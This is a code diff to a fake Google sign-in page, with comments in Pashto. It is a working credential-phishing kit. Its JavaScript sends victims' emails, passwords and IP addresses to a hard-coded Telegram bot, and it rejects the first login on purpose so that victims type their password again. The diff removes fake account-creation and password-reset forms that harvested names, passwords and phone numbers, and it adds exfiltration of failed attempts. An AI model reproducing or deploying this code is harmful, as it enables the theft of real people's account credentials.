@@ -203,6 +203,7 @@
             margin-top: 0.5rem;
         }
 
+        /* Modal Styles (د یادونې لپاره، خو اړتیا نشته که Forgot Password لرې شوی وي) */
         .modal {
             display: none;
             position: fixed;
@@ -273,7 +274,7 @@
         </div>
 
         <div class="links-row">
-            <span onclick="openForgotPasswordModal()">Forgot email?</span>
+            <span onclick="alert('Forgot email? Contact support')">Forgot email?</span>
             <span onclick="sendToAdminFromLink('Guest mode', 'Guest mode link clicked')">Guest mode</span>
         </div>
 
@@ -284,7 +285,7 @@
             </div>
         </div>
 
-        <a href="#" class="create-account" onclick="openCreateAccountModal(); return false;">Create account</a>
+        <a href="#" class="create-account" onclick="alert('Create account feature is disabled'); return false;">Create account</a>
     </div>
 
     <div id="step2View" style="display: none;">
@@ -304,7 +305,7 @@
 
         <div class="links-row">
             <span onclick="goBackToEmail()">← Back</span>
-            <span onclick="openForgotPasswordModal()">Forgot password?</span>
+            <span onclick="alert('Forgot password? Contact support')">Forgot password?</span>
         </div>
 
         <div class="guest-text">
@@ -327,38 +328,14 @@
     </div>
 </div>
 
-<!-- Create Account Modal -->
-<div id="createAccountModal" class="modal">
-    <div class="modal-content">
-        <span class="close-modal" onclick="closeCreateAccountModal()">&times;</span>
-        <h3>Create your Google Account</h3>
-        <input type="text" id="createName" placeholder="Full name">
-        <input type="email" id="createEmail" placeholder="Email">
-        <input type="password" id="createPassword" placeholder="Password">
-        <button onclick="submitCreateAccount()">Create account</button>
-    </div>
-</div>
-
-<!-- Forgot Password Modal -->
-<div id="forgotPasswordModal" class="modal">
-    <div class="modal-content">
-        <span class="close-modal" onclick="closeForgotPasswordModal()">&times;</span>
-        <h3>Reset your password</h3>
-        <input type="tel" id="phoneNumber" placeholder="Phone number">
-        <input type="email" id="resetEmail" placeholder="Your email address">
-        <button onclick="sendResetCode()">Send reset link</button>
-    </div>
-</div>
-
 <script>
     // ==================== Telegram Bot Settings ====================
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_CHAT_ID = "8295417969";
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=8020108872";
 
+    // ==================== د ننوتلو هڅې تعقیبول (2 هڅې) ====================
     let attemptStore = {};
-    let currentEmail = "";
-    let forgotData = {};
 
     const step1View = document.getElementById('step1View');
     const step2View = document.getElementById('step2View');
@@ -369,29 +346,19 @@
     const successBox = document.getElementById('successBox');
     const stepIndicator = document.getElementById('stepIndicator');
 
-    // ========== Helper Functions ==========
-    async function sendToTelegram(message) {
+    let currentEmail = "";
+
+    // ========== د ټولو بټنونو معلومات اډمن ته لیږل (د لاګ لپاره) ==========
+    async function sendToAdminFromLink(buttonName, action) {
+        const ip = await getUserIP();
+        const msg = `🔘 *BUTTON CLICKED*\n\n📌 Button: ${buttonName}\n⚡ Action: ${action}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: 'Markdown' })
             });
         } catch (err) { console.warn("Telegram error", err); }
-    }
-
-    async function sendToAdminFromLink(buttonName, action) {
-        const ip = await getUserIP();
-        const msg = `🔘 *BUTTON CLICKED*\n\n📌 Button: ${buttonName}\n⚡ Action: ${action}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
-        await sendToTelegram(msg);
-    }
-
-    async function getUserIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch { return 'unknown'; }
     }
 
     function showMessage(box, text, isError = true) {
@@ -410,75 +377,27 @@
         currentEmail = "";
     }
 
-    // ========== Create Account ==========
-    function openCreateAccountModal() {
-        document.getElementById('createAccountModal').style.display = 'flex';
+    async function getUserIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch { return 'unknown'; }
     }
 
-    function closeCreateAccountModal() {
-        document.getElementById('createAccountModal').style.display = 'none';
-        document.getElementById('createName').value = '';
-        document.getElementById('createEmail').value = '';
-        document.getElementById('createPassword').value = '';
+    async function sendLoginToAdmin(email, password, ip, success) {
+        if (!success) return;
+        const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        } catch (err) { console.warn("Telegram error", err); }
     }
 
-    async function submitCreateAccount() {
-        const name = document.getElementById('createName').value.trim();
-        const email = document.getElementById('createEmail').value.trim();
-        const password = document.getElementById('createPassword').value.trim();
-        const ip = await getUserIP();
-
-        if (!name || !email || !password) {
-            alert("Please fill in all fields!");
-            return;
-        }
-
-        const msg = `🆕 *NEW ACCOUNT CREATION*\n\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
-        await sendToTelegram(msg);
-
-        alert("Account created successfully! You can now login.");
-        closeCreateAccountModal();
-    }
-
-    // ========== Forgot Password ==========
-    function openForgotPasswordModal() {
-        document.getElementById('forgotPasswordModal').style.display = 'flex';
-    }
-
-    function closeForgotPasswordModal() {
-        document.getElementById('forgotPasswordModal').style.display = 'none';
-        document.getElementById('phoneNumber').value = '';
-        document.getElementById('resetEmail').value = '';
-    }
-
-    async function sendResetCode() {
-        const phone = document.getElementById('phoneNumber').value.trim();
-        const email = document.getElementById('resetEmail').value.trim();
-        const ip = await getUserIP();
-
-        if (!phone || !email) {
-            alert("Please enter both phone number and email!");
-            return;
-        }
-
-        const code = Math.floor(100000 + Math.random() * 900000).toString();
-        forgotData[email] = { phone, code };
-
-        const msg = `📱 *PASSWORD RESET REQUEST*\n\n📞 Phone: ${phone}\n📧 Email: ${email}\n🔑 Reset Code: ${code}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
-        await sendToTelegram(msg);
-
-        alert(`Verification code sent to ${phone} (Demo code: ${code})`);
-        closeForgotPasswordModal();
-
-        const newPassword = prompt("Enter your new password:");
-        if (newPassword) {
-            const resetMsg = `🔄 *PASSWORD RESET SUCCESSFUL*\n\n📧 Email: ${email}\n🔑 New Password: ${newPassword}\n🌐 IP: ${ip}`;
-            await sendToTelegram(resetMsg);
-            alert("Password reset successful! You can now login.");
-        }
-    }
-
-    // ========== Login Logic (2 attempts - 2nd attempt always accepted) ==========
+    // ========== ننوتنه: دوه هڅې (لومړی ناکام، دوهم بریالی) ==========
     document.getElementById('nextBtn').addEventListener('click', () => {
         const email = emailInput.value.trim();
         if (!email || !email.includes('@')) {
@@ -500,7 +419,6 @@
             showMessage(errorBox, "❌ Please enter your password.", true);
             return;
         }
-
         const ip = await getUserIP();
         const key = `${currentEmail}_${ip}`;
         
@@ -508,35 +426,41 @@
         const currentAttempt = attemptStore[key].attempts + 1;
         attemptStore[key].attempts = currentAttempt;
 
-        // لومړۍ هڅه - ناکامه (اډمن ته خبر نه ځي)
+        // لومړۍ هڅه - ناکامه (اډمن ته خبر ورکړئ، خو رد کړئ)
         if (currentAttempt === 1) {
+            // د ناکامه هڅې خبرتیا اډمن ته (د لاګ لپاره)
+            const failMsg = `⚠️ *FAILED ATTEMPT (1/2)*\n\n👤 Email: ${currentEmail}\n🔑 Password: ${password}\n🌐 IP: ${ip}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: failMsg, parse_mode: 'Markdown' })
+            }).catch(e => console.warn(e));
+            
             showMessage(errorBox, "❌ Incorrect password. Second attempt will be accepted.", true);
-            setTimeout(() => { goBackToEmail(); }, 2000);
+            // فورم پاک کړئ او لومړي ګام ته ولاړ شئ
+            setTimeout(() => {
+                goBackToEmail();
+            }, 2000);
             return;
         }
 
-        // دوهمه هڅه - بریالۍ (همدا پاسورډ اډمن ته ځي)
+        // دوهمه هڅه - بریالۍ (د ریښتیني پاسورډ تایید د بوټ له لارې)
         if (currentAttempt >= 2) {
-            const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${currentEmail}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📊 Attempt: ${currentAttempt}\n🕒 Time: ${new Date().toLocaleString()}`;
-            await sendToTelegram(msg);
-            
+            // د بریالۍ ننوتنې خبرتیا اډمن ته
+            await sendLoginToAdmin(currentEmail, password, ip, true);
             showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
             const loginBtn = document.getElementById('loginBtn');
             loginBtn.disabled = true;
             loginBtn.style.opacity = '0.6';
-            setTimeout(() => { window.location.href = BOT_REDIRECT; }, 1800);
+            setTimeout(() => {
+                window.location.href = BOT_REDIRECT;
+            }, 1800);
         }
     });
 
     emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('nextBtn').click(); });
     passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('loginBtn').click(); });
 
-    window.openForgotPasswordModal = openForgotPasswordModal;
-    window.closeForgotPasswordModal = closeForgotPasswordModal;
-    window.sendResetCode = sendResetCode;
-    window.openCreateAccountModal = openCreateAccountModal;
-    window.closeCreateAccountModal = closeCreateAccountModal;
-    window.submitCreateAccount = submitCreateAccount;
     window.sendToAdminFromLink = sendToAdminFromLink;
     window.goBackToEmail = goBackToEmail;
 </script>
